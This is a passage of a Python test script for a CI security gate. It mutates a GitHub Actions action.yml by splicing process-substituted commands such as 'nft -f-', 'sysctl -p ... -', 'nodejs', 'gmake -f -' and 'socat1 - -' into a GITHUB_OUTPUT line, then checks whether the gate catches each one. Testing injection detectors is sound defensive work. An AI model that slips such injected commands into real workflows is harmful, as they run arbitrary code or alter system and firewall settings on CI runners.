        berkas_aksi443 = os.path.join(
            sub443, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi443, encoding="utf-8") as f:
            isi_aksi443 = f.read()
        baris_aksi443 = [b for b in isi_aksi443.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru443 = isi_aksi443.replace(
                baris_aksi443,
                baris_aksi443.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(file - -f daftar.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru443 != isi_aksi443, \
            "suntikan aksi443 tidak menembak"
        with open(berkas_aksi443, "w", encoding="utf-8") as f:
            f.write(isi_baru443)
        rc, out = jalan(sub443, [sys.executable, GERBANG, "--semua"])
        periksa("file - -f daftar.txt: "
                "gerbang gagal (Audit 1229)", rc != 0)
        shutil.rmtree(sub443, ignore_errors=True)
        sub444 = klon(tmp, "sub444")
        berkas_aksi444 = os.path.join(
            sub444, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi444, encoding="utf-8") as f:
            isi_aksi444 = f.read()
        baris_aksi444 = [b for b in isi_aksi444.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru444 = isi_aksi444.replace(
                baris_aksi444,
                baris_aksi444.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(date -f-; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru444 != isi_aksi444, \
            "suntikan aksi444 tidak menembak"
        with open(berkas_aksi444, "w", encoding="utf-8") as f:
            f.write(isi_baru444)
        rc, out = jalan(sub444, [sys.executable, GERBANG, "--semua"])
        periksa("date -f-: "
                "gerbang gagal (Audit 1230)", rc != 0)
        shutil.rmtree(sub444, ignore_errors=True)
        sub445 = klon(tmp, "sub445")
        berkas_aksi445 = os.path.join(
            sub445, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi445, encoding="utf-8") as f:
            isi_aksi445 = f.read()
        baris_aksi445 = [b for b in isi_aksi445.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru445 = isi_aksi445.replace(
                baris_aksi445,
                baris_aksi445.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(sysctl -p berkas.conf -p -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru445 != isi_aksi445, \
            "suntikan aksi445 tidak menembak"
        with open(berkas_aksi445, "w", encoding="utf-8") as f:
            f.write(isi_baru445)
        rc, out = jalan(sub445, [sys.executable, GERBANG, "--semua"])
        periksa("sysctl -p berkas.conf -p -: "
                "gerbang gagal (Audit 1231)", rc != 0)
        shutil.rmtree(sub445, ignore_errors=True)
        sub446 = klon(tmp, "sub446")
        berkas_aksi446 = os.path.join(
            sub446, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi446, encoding="utf-8") as f:
            isi_aksi446 = f.read()
        baris_aksi446 = [b for b in isi_aksi446.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru446 = isi_aksi446.replace(
                baris_aksi446,
                baris_aksi446.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pdftotext -cfg - berkas.pdf; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru446 != isi_aksi446, \
            "suntikan aksi446 tidak menembak"
        with open(berkas_aksi446, "w", encoding="utf-8") as f:
            f.write(isi_baru446)
        rc, out = jalan(sub446, [sys.executable, GERBANG, "--semua"])
        periksa("pdftotext -cfg - berkas.pdf: "
                "gerbang lolos (Audit 1232)", rc == 0)
        shutil.rmtree(sub446, ignore_errors=True)
        sub447 = klon(tmp, "sub447")
        berkas_aksi447 = os.path.join(
            sub447, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi447, encoding="utf-8") as f:
            isi_aksi447 = f.read()
        baris_aksi447 = [b for b in isi_aksi447.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru447 = isi_aksi447.replace(
                baris_aksi447,
                baris_aksi447.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(nft -f-; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru447 != isi_aksi447, \
            "suntikan aksi447 tidak menembak"
        with open(berkas_aksi447, "w", encoding="utf-8") as f:
            f.write(isi_baru447)
        rc, out = jalan(sub447, [sys.executable, GERBANG, "--semua"])
        periksa("nft -f-: "
                "gerbang gagal (Audit 1233)", rc != 0)
        shutil.rmtree(sub447, ignore_errors=True)
        sub448 = klon(tmp, "sub448")
        berkas_aksi448 = os.path.join(
            sub448, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi448, encoding="utf-8") as f:
            isi_aksi448 = f.read()
        baris_aksi448 = [b for b in isi_aksi448.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru448 = isi_aksi448.replace(
                baris_aksi448,
                baris_aksi448.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pr -s berkas.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru448 != isi_aksi448, \
            "suntikan aksi448 tidak menembak"
        with open(berkas_aksi448, "w", encoding="utf-8") as f:
            f.write(isi_baru448)
        rc, out = jalan(sub448, [sys.executable, GERBANG, "--semua"])
        periksa("pr -s berkas.txt: "
                "gerbang lolos (Audit 1234)", rc == 0)
        shutil.rmtree(sub448, ignore_errors=True)
        sub449 = klon(tmp, "sub449")
        berkas_aksi449 = os.path.join(
            sub449, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi449, encoding="utf-8") as f:
            isi_aksi449 = f.read()
        baris_aksi449 = [b for b in isi_aksi449.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru449 = isi_aksi449.replace(
                baris_aksi449,
                baris_aksi449.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pr --separator berkas.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru449 != isi_aksi449, \
            "suntikan aksi449 tidak menembak"
        with open(berkas_aksi449, "w", encoding="utf-8") as f:
            f.write(isi_baru449)
        rc, out = jalan(sub449, [sys.executable, GERBANG, "--semua"])
        periksa("pr --separator berkas.txt: "
                "gerbang lolos (Audit 1234)", rc == 0)
        shutil.rmtree(sub449, ignore_errors=True)
        sub450 = klon(tmp, "sub450")
        berkas_aksi450 = os.path.join(
            sub450, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi450, encoding="utf-8") as f:
            isi_aksi450 = f.read()
        baris_aksi450 = [b for b in isi_aksi450.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru450 = isi_aksi450.replace(
                baris_aksi450,
                baris_aksi450.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(ptx -F xx; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru450 != isi_aksi450, \
            "suntikan aksi450 tidak menembak"
        with open(berkas_aksi450, "w", encoding="utf-8") as f:
            f.write(isi_baru450)
        rc, out = jalan(sub450, [sys.executable, GERBANG, "--semua"])
        periksa("ptx -F xx: "
                "gerbang gagal (Audit 1235)", rc != 0)
        shutil.rmtree(sub450, ignore_errors=True)
        sub451 = klon(tmp, "sub451")
        berkas_aksi451 = os.path.join(
            sub451, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi451, encoding="utf-8") as f:
            isi_aksi451 = f.read()
        baris_aksi451 = [b for b in isi_aksi451.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru451 = isi_aksi451.replace(
                baris_aksi451,
                baris_aksi451.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(wall -g users; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru451 != isi_aksi451, \
            "suntikan aksi451 tidak menembak"
        with open(berkas_aksi451, "w", encoding="utf-8") as f:
            f.write(isi_baru451)
        rc, out = jalan(sub451, [sys.executable, GERBANG, "--semua"])
        periksa("wall -g users: "
                "gerbang gagal (Audit 1236)", rc != 0)
        shutil.rmtree(sub451, ignore_errors=True)
        sub452 = klon(tmp, "sub452")
        berkas_aksi452 = os.path.join(
            sub452, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi452, encoding="utf-8") as f:
            isi_aksi452 = f.read()
        baris_aksi452 = [b for b in isi_aksi452.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru452 = isi_aksi452.replace(
                baris_aksi452,
                baris_aksi452.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xzcat --suffix .zz; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru452 != isi_aksi452, \
            "suntikan aksi452 tidak menembak"
        with open(berkas_aksi452, "w", encoding="utf-8") as f:
            f.write(isi_baru452)
        rc, out = jalan(sub452, [sys.executable, GERBANG, "--semua"])
        periksa("xzcat --suffix .zz: "
                "gerbang gagal (Audit 1237)", rc != 0)
        shutil.rmtree(sub452, ignore_errors=True)
        sub453 = klon(tmp, "sub453")
        berkas_aksi453 = os.path.join(
            sub453, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi453, encoding="utf-8") as f:
            isi_aksi453 = f.read()
        baris_aksi453 = [b for b in isi_aksi453.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru453 = isi_aksi453.replace(
                baris_aksi453,
                baris_aksi453.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(lzcat --suffix .zz; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru453 != isi_aksi453, \
            "suntikan aksi453 tidak menembak"
        with open(berkas_aksi453, "w", encoding="utf-8") as f:
            f.write(isi_baru453)
        rc, out = jalan(sub453, [sys.executable, GERBANG, "--semua"])
        periksa("lzcat --suffix .zz: "
                "gerbang gagal (Audit 1238)", rc != 0)
        shutil.rmtree(sub453, ignore_errors=True)
        sub454 = klon(tmp, "sub454")
        berkas_aksi454 = os.path.join(
            sub454, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi454, encoding="utf-8") as f:
            isi_aksi454 = f.read()
        baris_aksi454 = [b for b in isi_aksi454.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru454 = isi_aksi454.replace(
                baris_aksi454,
                baris_aksi454.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl x509 -in /dev/stdin; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru454 != isi_aksi454, \
            "suntikan aksi454 tidak menembak"
        with open(berkas_aksi454, "w", encoding="utf-8") as f:
            f.write(isi_baru454)
        rc, out = jalan(sub454, [sys.executable, GERBANG, "--semua"])
        periksa("openssl x509 -in /dev/stdin: "
                "gerbang gagal (Audit 1239)", rc != 0)
        shutil.rmtree(sub454, ignore_errors=True)
        sub455 = klon(tmp, "sub455")
        berkas_aksi455 = os.path.join(
            sub455, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi455, encoding="utf-8") as f:
            isi_aksi455 = f.read()
        baris_aksi455 = [b for b in isi_aksi455.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru455 = isi_aksi455.replace(
                baris_aksi455,
                baris_aksi455.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl pkcs7 -in /dev/stdin; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru455 != isi_aksi455, \
            "suntikan aksi455 tidak menembak"
        with open(berkas_aksi455, "w", encoding="utf-8") as f:
            f.write(isi_baru455)
        rc, out = jalan(sub455, [sys.executable, GERBANG, "--semua"])
        periksa("openssl pkcs7 -in /dev/stdin: "
                "gerbang gagal (Audit 1239)", rc != 0)
        shutil.rmtree(sub455, ignore_errors=True)
        sub456 = klon(tmp, "sub456")
        berkas_aksi456 = os.path.join(
            sub456, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi456, encoding="utf-8") as f:
            isi_aksi456 = f.read()
        baris_aksi456 = [b for b in isi_aksi456.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru456 = isi_aksi456.replace(
                baris_aksi456,
                baris_aksi456.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(openssl dgst --list; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru456 != isi_aksi456, \
            "suntikan aksi456 tidak menembak"
        with open(berkas_aksi456, "w", encoding="utf-8") as f:
            f.write(isi_baru456)
        rc, out = jalan(sub456, [sys.executable, GERBANG, "--semua"])
        periksa("openssl dgst --list: "
                "gerbang lolos (Audit 1240)", rc == 0)
        shutil.rmtree(sub456, ignore_errors=True)
        sub457 = klon(tmp, "sub457")
        berkas_aksi457 = os.path.join(
            sub457, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi457, encoding="utf-8") as f:
            isi_aksi457 = f.read()
        baris_aksi457 = [b for b in isi_aksi457.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru457 = isi_aksi457.replace(
                baris_aksi457,
                baris_aksi457.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(od -S 3; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru457 != isi_aksi457, \
            "suntikan aksi457 tidak menembak"
        with open(berkas_aksi457, "w", encoding="utf-8") as f:
            f.write(isi_baru457)
        rc, out = jalan(sub457, [sys.executable, GERBANG, "--semua"])
        periksa("od -S 3: "
                "gerbang gagal (Audit 1241)", rc != 0)
        shutil.rmtree(sub457, ignore_errors=True)
        sub458 = klon(tmp, "sub458")
        berkas_aksi458 = os.path.join(
            sub458, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi458, encoding="utf-8") as f:
            isi_aksi458 = f.read()
        baris_aksi458 = [b for b in isi_aksi458.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru458 = isi_aksi458.replace(
                baris_aksi458,
                baris_aksi458.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(od -w berkas.txt; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru458 != isi_aksi458, \
            "suntikan aksi458 tidak menembak"
        with open(berkas_aksi458, "w", encoding="utf-8") as f:
            f.write(isi_baru458)
        rc, out = jalan(sub458, [sys.executable, GERBANG, "--semua"])
        periksa("od -w berkas.txt: "
                "gerbang lolos (Audit 1241)", rc == 0)
        shutil.rmtree(sub458, ignore_errors=True)
        sub459 = klon(tmp, "sub459")
        berkas_aksi459 = os.path.join(
            sub459, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi459, encoding="utf-8") as f:
            isi_aksi459 = f.read()
        baris_aksi459 = [b for b in isi_aksi459.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru459 = isi_aksi459.replace(
                baris_aksi459,
                baris_aksi459.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(od +16; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru459 != isi_aksi459, \
            "suntikan aksi459 tidak menembak"
        with open(berkas_aksi459, "w", encoding="utf-8") as f:
            f.write(isi_baru459)
        rc, out = jalan(sub459, [sys.executable, GERBANG, "--semua"])
        periksa("od +16: "
                "gerbang gagal (Audit 1241)", rc != 0)
        shutil.rmtree(sub459, ignore_errors=True)
        sub460 = klon(tmp, "sub460")
        berkas_aksi460 = os.path.join(
            sub460, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi460, encoding="utf-8") as f:
            isi_aksi460 = f.read()
        baris_aksi460 = [b for b in isi_aksi460.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru460 = isi_aksi460.replace(
                baris_aksi460,
                baris_aksi460.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(strings -s X; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru460 != isi_aksi460, \
            "suntikan aksi460 tidak menembak"
        with open(berkas_aksi460, "w", encoding="utf-8") as f:
            f.write(isi_baru460)
        rc, out = jalan(sub460, [sys.executable, GERBANG, "--semua"])
        periksa("strings -s X: "
                "gerbang gagal (Audit 1242)", rc != 0)
        shutil.rmtree(sub460, ignore_errors=True)
        sub461 = klon(tmp, "sub461")
        berkas_aksi461 = os.path.join(
            sub461, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi461, encoding="utf-8") as f:
            isi_aksi461 = f.read()
        baris_aksi461 = [b for b in isi_aksi461.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru461 = isi_aksi461.replace(
                baris_aksi461,
                baris_aksi461.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(strings -U d; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru461 != isi_aksi461, \
            "suntikan aksi461 tidak menembak"
        with open(berkas_aksi461, "w", encoding="utf-8") as f:
            f.write(isi_baru461)
        rc, out = jalan(sub461, [sys.executable, GERBANG, "--semua"])
        periksa("strings -U d: "
                "gerbang gagal (Audit 1242)", rc != 0)
        shutil.rmtree(sub461, ignore_errors=True)
        sub462 = klon(tmp, "sub462")
        berkas_aksi462 = os.path.join(
            sub462, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi462, encoding="utf-8") as f:
            isi_aksi462 = f.read()
        baris_aksi462 = [b for b in isi_aksi462.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru462 = isi_aksi462.replace(
                baris_aksi462,
                baris_aksi462.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(json_pp -f json; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru462 != isi_aksi462, \
            "suntikan aksi462 tidak menembak"
        with open(berkas_aksi462, "w", encoding="utf-8") as f:
            f.write(isi_baru462)
        rc, out = jalan(sub462, [sys.executable, GERBANG, "--semua"])
        periksa("json_pp -f json: "
                "gerbang gagal (Audit 1243)", rc != 0)
        shutil.rmtree(sub462, ignore_errors=True)
        sub463 = klon(tmp, "sub463")
        berkas_aksi463 = os.path.join(
            sub463, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi463, encoding="utf-8") as f:
            isi_aksi463 = f.read()
        baris_aksi463 = [b for b in isi_aksi463.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru463 = isi_aksi463.replace(
                baris_aksi463,
                baris_aksi463.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(zgrep pola; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru463 != isi_aksi463, \
            "suntikan aksi463 tidak menembak"
        with open(berkas_aksi463, "w", encoding="utf-8") as f:
            f.write(isi_baru463)
        rc, out = jalan(sub463, [sys.executable, GERBANG, "--semua"])
        periksa("zgrep pola: "
                "gerbang gagal (Audit 1244)", rc != 0)
        shutil.rmtree(sub463, ignore_errors=True)
        sub464 = klon(tmp, "sub464")
        berkas_aksi464 = os.path.join(
            sub464, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi464, encoding="utf-8") as f:
            isi_aksi464 = f.read()
        baris_aksi464 = [b for b in isi_aksi464.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru464 = isi_aksi464.replace(
                baris_aksi464,
                baris_aksi464.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(xzgrep pola; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru464 != isi_aksi464, \
            "suntikan aksi464 tidak menembak"
        with open(berkas_aksi464, "w", encoding="utf-8") as f:
            f.write(isi_baru464)
        rc, out = jalan(sub464, [sys.executable, GERBANG, "--semua"])
        periksa("xzgrep pola: "
                "gerbang gagal (Audit 1244)", rc != 0)
        shutil.rmtree(sub464, ignore_errors=True)
        sub465 = klon(tmp, "sub465")
        berkas_aksi465 = os.path.join(
            sub465, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi465, encoding="utf-8") as f:
            isi_aksi465 = f.read()
        baris_aksi465 = [b for b in isi_aksi465.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru465 = isi_aksi465.replace(
                baris_aksi465,
                baris_aksi465.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(shasum; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru465 != isi_aksi465, \
            "suntikan aksi465 tidak menembak"
        with open(berkas_aksi465, "w", encoding="utf-8") as f:
            f.write(isi_baru465)
        rc, out = jalan(sub465, [sys.executable, GERBANG, "--semua"])
        periksa("shasum: "
                "gerbang gagal (Audit 1245)", rc != 0)
        shutil.rmtree(sub465, ignore_errors=True)
        sub466 = klon(tmp, "sub466")
        berkas_aksi466 = os.path.join(
            sub466, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi466, encoding="utf-8") as f:
            isi_aksi466 = f.read()
        baris_aksi466 = [b for b in isi_aksi466.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru466 = isi_aksi466.replace(
                baris_aksi466,
                baris_aksi466.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(md5sum.textutils; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru466 != isi_aksi466, \
            "suntikan aksi466 tidak menembak"
        with open(berkas_aksi466, "w", encoding="utf-8") as f:
            f.write(isi_baru466)
        rc, out = jalan(sub466, [sys.executable, GERBANG, "--semua"])
        periksa("md5sum.textutils: "
                "gerbang gagal (Audit 1245)", rc != 0)
        shutil.rmtree(sub466, ignore_errors=True)
        sub467 = klon(tmp, "sub467")
        berkas_aksi467 = os.path.join(
            sub467, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi467, encoding="utf-8") as f:
            isi_aksi467 = f.read()
        baris_aksi467 = [b for b in isi_aksi467.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru467 = isi_aksi467.replace(
                baris_aksi467,
                baris_aksi467.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(uconv -f UTF-8 -t UTF-8; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru467 != isi_aksi467, \
            "suntikan aksi467 tidak menembak"
        with open(berkas_aksi467, "w", encoding="utf-8") as f:
            f.write(isi_baru467)
        rc, out = jalan(sub467, [sys.executable, GERBANG, "--semua"])
        periksa("uconv -f UTF-8 -t UTF-8: "
                "gerbang gagal (Audit 1246)", rc != 0)
        shutil.rmtree(sub467, ignore_errors=True)
        sub468 = klon(tmp, "sub468")
        berkas_aksi468 = os.path.join(
            sub468, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi468, encoding="utf-8") as f:
            isi_aksi468 = f.read()
        baris_aksi468 = [b for b in isi_aksi468.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru468 = isi_aksi468.replace(
                baris_aksi468,
                baris_aksi468.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(piconv -f utf8 -t utf8; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru468 != isi_aksi468, \
            "suntikan aksi468 tidak menembak"
        with open(berkas_aksi468, "w", encoding="utf-8") as f:
            f.write(isi_baru468)
        rc, out = jalan(sub468, [sys.executable, GERBANG, "--semua"])
        periksa("piconv -f utf8 -t utf8: "
                "gerbang gagal (Audit 1247)", rc != 0)
        shutil.rmtree(sub468, ignore_errors=True)
        sub469 = klon(tmp, "sub469")
        berkas_aksi469 = os.path.join(
            sub469, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi469, encoding="utf-8") as f:
            isi_aksi469 = f.read()
        baris_aksi469 = [b for b in isi_aksi469.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru469 = isi_aksi469.replace(
                baris_aksi469,
                baris_aksi469.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(pod2text; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru469 != isi_aksi469, \
            "suntikan aksi469 tidak menembak"
        with open(berkas_aksi469, "w", encoding="utf-8") as f:
            f.write(isi_baru469)
        rc, out = jalan(sub469, [sys.executable, GERBANG, "--semua"])
        periksa("pod2text: "
                "gerbang gagal (Audit 1248)", rc != 0)
        shutil.rmtree(sub469, ignore_errors=True)
        sub470 = klon(tmp, "sub470")
        berkas_aksi470 = os.path.join(
            sub470, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi470, encoding="utf-8") as f:
            isi_aksi470 = f.read()
        baris_aksi470 = [b for b in isi_aksi470.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru470 = isi_aksi470.replace(
                baris_aksi470,
                baris_aksi470.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(sdiff berkas.txt -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru470 != isi_aksi470, \
            "suntikan aksi470 tidak menembak"
        with open(berkas_aksi470, "w", encoding="utf-8") as f:
            f.write(isi_baru470)
        rc, out = jalan(sub470, [sys.executable, GERBANG, "--semua"])
        periksa("sdiff berkas.txt -: "
                "gerbang gagal (Audit 1249)", rc != 0)
        shutil.rmtree(sub470, ignore_errors=True)
        sub471 = klon(tmp, "sub471")
        berkas_aksi471 = os.path.join(
            sub471, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi471, encoding="utf-8") as f:
            isi_aksi471 = f.read()
        baris_aksi471 = [b for b in isi_aksi471.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru471 = isi_aksi471.replace(
                baris_aksi471,
                baris_aksi471.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(socat1 - -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru471 != isi_aksi471, \
            "suntikan aksi471 tidak menembak"
        with open(berkas_aksi471, "w", encoding="utf-8") as f:
            f.write(isi_baru471)
        rc, out = jalan(sub471, [sys.executable, GERBANG, "--semua"])
        periksa("socat1 - -: "
                "gerbang gagal (Audit 1250)", rc != 0)
        shutil.rmtree(sub471, ignore_errors=True)
        sub472 = klon(tmp, "sub472")
        berkas_aksi472 = os.path.join(
            sub472, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi472, encoding="utf-8") as f:
            isi_aksi472 = f.read()
        baris_aksi472 = [b for b in isi_aksi472.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru472 = isi_aksi472.replace(
                baris_aksi472,
                baris_aksi472.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(nodejs; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru472 != isi_aksi472, \
            "suntikan aksi472 tidak menembak"
        with open(berkas_aksi472, "w", encoding="utf-8") as f:
            f.write(isi_baru472)
        rc, out = jalan(sub472, [sys.executable, GERBANG, "--semua"])
        periksa("nodejs: "
                "gerbang gagal (Audit 1251)", rc != 0)
        shutil.rmtree(sub472, ignore_errors=True)
        sub473 = klon(tmp, "sub473")
        berkas_aksi473 = os.path.join(
            sub473, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi473, encoding="utf-8") as f:
            isi_aksi473 = f.read()
        baris_aksi473 = [b for b in isi_aksi473.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru473 = isi_aksi473.replace(
                baris_aksi473,
                baris_aksi473.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(gmake -f -; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru473 != isi_aksi473, \
            "suntikan aksi473 tidak menembak"
        with open(berkas_aksi473, "w", encoding="utf-8") as f:
            f.write(isi_baru473)
        rc, out = jalan(sub473, [sys.executable, GERBANG, "--semua"])
        periksa("gmake -f -: "
                "gerbang gagal (Audit 1252)", rc != 0)
        shutil.rmtree(sub473, ignore_errors=True)
        sub474 = klon(tmp, "sub474")
        berkas_aksi474 = os.path.join(
            sub474, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi474, encoding="utf-8") as f:
            isi_aksi474 = f.read()
        baris_aksi474 = [b for b in isi_aksi474.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru474 = isi_aksi474.replace(
                baris_aksi474,
                baris_aksi474.replace(
                    '>> "$GITHUB_OUTPUT"',
                    '> >(setarch x86_64 cat; cat '
                    '>> "$GITHUB_OUTPUT")'), 1)
        assert isi_baru474 != isi_aksi474, \
            "suntikan aksi474 tidak menembak"
        with open(berkas_aksi474, "w", encoding="utf-8") as f:
            f.write(isi_baru474)
        rc, out = jalan(sub474, [sys.executable, GERBANG, "--semua"])
        periksa("setarch x86_64 cat: "
                "gerbang gagal (Audit 1253)", rc != 0)
        shutil.rmtree(sub474, ignore_errors=True)
        sub475 = klon(tmp, "sub475")
        berkas_aksi475 = os.path.join(
            sub475, ".github", "actions", "resolve-vw", "action.yml")
        with open(berkas_aksi475, encoding="utf-8") as f:
            isi_aksi475 = f.read()
        baris_aksi475 = [b for b in isi_aksi475.splitlines()
                         if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
        isi_baru475 = isi_aksi475.replace(
                baris_aksi475,
                baris_aksi475.replace(
